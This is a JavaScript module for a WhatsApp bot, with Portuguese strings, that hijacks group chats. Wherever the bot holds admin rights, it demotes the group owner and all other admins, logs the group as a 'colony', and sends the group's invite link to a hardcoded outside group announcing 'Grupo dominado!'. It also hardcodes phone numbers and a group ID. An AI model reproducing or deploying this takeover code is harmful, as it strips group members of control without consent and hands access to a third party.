module.exports = async function (client, message) {
    if ( await message.isGroupMsg ) {
        let isColony = false;
        const fs = require('fs');
        const filePath = 'public/data/colony.json';
        const fileBuffer = fs.readFileSync(filePath);
        const fileJson = JSON.parse(fileBuffer);
        let register = fileJson;

        register.forEach((element) => {
            if ( element.chatId === message.chatId) {
                isColony = true;
            }
        });

        if ( !isColony ) {
            let isAdm = false;
            let haveOwnerAdm = false;
            const userBot = "552899223882";
            const nameGroup = await message.chat.name;
            const resenhaId = "5528999670808-1558280621@g.us";
            const ownerAdm = await message.chat.groupMetadata.owner;

            const admList = await client.getGroupAdmins ( await message.chatId );
            for (let index = 0; index < admList.length; index++){
                if ( admList[index].user == "552899223882"){
                    isAdm = true;
                }
            }
            if ( isAdm ) {
                for (let index = 0; index < admList.length; index++) {
                    if ( (admList[index].user + "@c.us") == ownerAdm ){
                        haveOwnerAdm = true;
                    }
                }
                if ( haveOwnerAdm ) {
                    await client.demoteParticipant(await message.chatId, ownerAdm);
                    const newAdmList = await client.getGroupAdmins(await message.chatId );
                    newAdmList.forEach(element => {
                        if ( (element.user + "@c.us") === ownerAdm ){
                            haveOwnerAdm = false;
                        }
                    });
                }
                if ( !haveOwnerAdm ) {
                    for (let index = 0; index < admList.length; index++) {
                        if ( admList[index].user != userBot ) {
                            await client.demoteParticipant(await message.chatId, (admList[index].user + "@c.us"));
                        }
                    }
                    register.push({"chatId": message.chatId});
                    const fileString = JSON.stringify(register, null, '\t');
                    fs.writeFileSync(filePath, fileString, 'utf-8');
                    const linkGroup = await client.getGroupInviteLink(await message.chatId);
                    await client.sendLinkPreview(resenhaId, linkGroup,`\nGrupo dominado!\n`, `*_${nameGroup}_*`);
                }
            }
        }
    }
}